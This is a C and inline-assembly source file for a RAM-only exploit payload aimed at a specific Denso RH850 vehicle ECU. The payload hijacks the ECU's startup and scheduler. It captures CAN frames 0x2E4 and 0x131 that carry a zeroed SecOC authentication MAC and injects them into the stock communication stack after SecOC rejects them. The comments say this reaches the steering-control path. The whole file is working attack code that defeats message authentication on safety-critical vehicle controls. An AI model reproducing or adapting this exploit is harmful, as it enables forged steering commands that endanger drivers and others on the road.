/*
 * Ephemeral SecOC receive bridge for Denso RH850/P1M-E 8965B4512000.
 *
 * This payload is intentionally RAM-only.  It reproduces the stock boot ->
 * application transition, owns the stock foreground scheduler, and inserts one
 * bounded hook between stock SecOC processing and stock COM/control processing.
 * A real reset clears the retained code page and restores the unmodified stock
 * path.
 *
 * The bridge marker is the same MAC28-only ablation used by the behavioral
 * proof tooling: byte-4 low nibble plus bytes 5..7 are zero.  Authentic payload
 * bytes and the transmitted freshness high nibble are left untouched.
 */

typedef void (*fn0_t)(void);
typedef void (*fn1_t)(unsigned int);
typedef void (*com_rx_t)(unsigned int, void *);

struct pdu_info {
  unsigned int data;
  unsigned short length;
  unsigned short pad;
};

#include "target_config.h"

#define STR_INNER(x) #x
#define STR(x) STR_INNER(x)

#define BRIDGE_PROFILE_COUNT       2u
#define SECURED_CLASSIC_LENGTH     8u
#define MAC28_ZERO_MASK            0xFFFFFF0Fu

static void post_context_startup(void) __attribute__((noreturn, noinline));

/*
 * Entry executes in bootloader context. Keep it assembly-only after calling
 * TARGET_APP_CPU_CONTEXT_INIT: that routine changes GP/TP/SP, so no old C stack frame
 * may be touched before jumping into post_context_startup().
 */
void __attribute__((noreturn)) exploit(void) {
  __asm__ volatile (
    "mov " STR(TARGET_BOOT_INIT_0) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_1) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_2) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_INIT_3) ", r12\n\tjarl [r12], lp\n\t"
    "mov " STR(TARGET_BOOT_VALIDITY_CHECK) ", r12\n\tjarl [r12], lp\n\t"
    "cmp r0, r10\n\tbne 1f\n\t"
    "mov " STR(TARGET_APP_CPU_CONTEXT_INIT) ", r12\n\tjarl [r12], lp\n\t"
    "jr _post_context_startup\n\t"
    "1: br 1b\n\t"
  );
  __builtin_unreachable();
}

static void call0(unsigned int address) __attribute__((noinline));
static void call0(unsigned int address) { ((fn0_t)address)(); }

/* Decode the exact RH850 JARL disp22 sequence already present in stock startup. */
static void post_context_startup(void) {
  unsigned int active_mask = 0u;

  for (unsigned int pc = TARGET_APP_STARTUP_FIRST_JARL; pc < TARGET_APP_STARTUP_AFTER_JARLS; pc += 4u) {
    unsigned int ins = *(volatile unsigned int *)pc;
    int signed_high6 = (int)(ins & 0x3Fu);
    signed_high6 = (signed_high6 ^ 0x20) - 0x20;
    call0(pc + ((unsigned int)(signed_high6 << 16) | (ins >> 16)));
  }
  ((fn1_t)TARGET_APP_STARTUP_FINAL_INIT)(0u);
  __asm__ volatile("ei");

  for (;;) {
    unsigned int frame[BRIDGE_PROFILE_COUNT][2] = {{0u, 0u}, {0u, 0u}};
    unsigned char counter[BRIDGE_PROFILE_COUNT] = {0u, 0u};
    unsigned int inject_mask = 0u;
    unsigned int timing = 0u;

    /* Exact target foreground tick poll/clear recovered by the manifest resolver. */
    __asm__ volatile("1: tst1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]\n\tbe 1b\n\tclr1 " STR(TARGET_TICK_BIT) ", " STR(TARGET_TICK_DISPLACEMENT) "[r0]");

    if (*(volatile unsigned char *)TARGET_FOREGROUND_TIMING_FLAG == 0x5Au) {
      call0(TARGET_FG_TIMING_BEGIN);
      timing = 1u;
    }
    call0(TARGET_FG_PRE_0);
    call0(TARGET_FG_PRE_1);
    call0(TARGET_FG_PRE_2);
    call0(TARGET_FG_PRE_3);

    call0(TARGET_AGG_0);

    /*
     * Snapshot a newly queued zero-MAC 0x2E4/0x131 before stock SecOC consumes
     * and clears its record.  active_mask makes a still-pending asynchronous
     * record edge-triggered instead of replaying it every foreground tick.
     */
    for (unsigned int i = 0u; i < BRIDGE_PROFILE_COUNT; i++) {
      unsigned int bit = 1u << i;
      volatile unsigned int *raw =
          (volatile unsigned int *)(TARGET_BRIDGE_RAW_BASE + i * TARGET_BRIDGE_RAW_STRIDE);
      volatile unsigned short *desc =
          (volatile unsigned short *)(TARGET_BRIDGE_DESC_BASE + i * TARGET_BRIDGE_DESC_STRIDE);
      volatile unsigned char *pdu_counter =
          (volatile unsigned char *)(TARGET_BRIDGE_COUNTER_BASE + i * TARGET_BRIDGE_COUNTER_STRIDE);

      if (*desc != SECURED_CLASSIC_LENGTH) {
        active_mask &= ~bit;
      } else if ((active_mask & bit) == 0u && (raw[1] & MAC28_ZERO_MASK) == 0u) {
        frame[i][0] = raw[0];
        frame[i][1] = raw[1];
        counter[i] = *pdu_counter;
        inject_mask |= bit;
        active_mask |= bit;
      }
    }

    /* Stock communication stack + SecOC verification/rejection/cleanup. */
    call0(TARGET_AGG_1);
    call0(TARGET_AGG_2);
    call0(TARGET_AGG_3);

    /*
     * If stock SecOC did not already deliver the exact PDU (counter unchanged),
     * feed the saved frame through the stock COM RxIndication API.  The normal
     * generated COM unpackers and all downstream steering arbitration/limits
     * therefore remain stock.
     */
    for (unsigned int i = 0u; i < BRIDGE_PROFILE_COUNT; i++) {
      volatile unsigned char *pdu_counter =
          (volatile unsigned char *)(TARGET_BRIDGE_COUNTER_BASE + i * TARGET_BRIDGE_COUNTER_STRIDE);
      if ((inject_mask & (1u << i)) != 0u && *pdu_counter == counter[i]) {
        struct pdu_info pdu = {(unsigned int)&frame[i][0], SECURED_CLASSIC_LENGTH, 0u};
        ((com_rx_t)TARGET_APPLICATION_COM_RX)(TARGET_BRIDGE_PDU_BASE + i * TARGET_BRIDGE_PDU_STRIDE, &pdu);
      }
    }

    call0(TARGET_AGG_4);
    call0(TARGET_AGG_5);
    call0(TARGET_FG_POST_0);
    call0(TARGET_FG_POST_1);
    call0(TARGET_FG_POST_2);
    if (timing != 0u) {
      call0(TARGET_FG_TIMING_END);
    }
    (*(volatile unsigned char *)TARGET_FOREGROUND_TICK_COUNTER)++;
  }
}
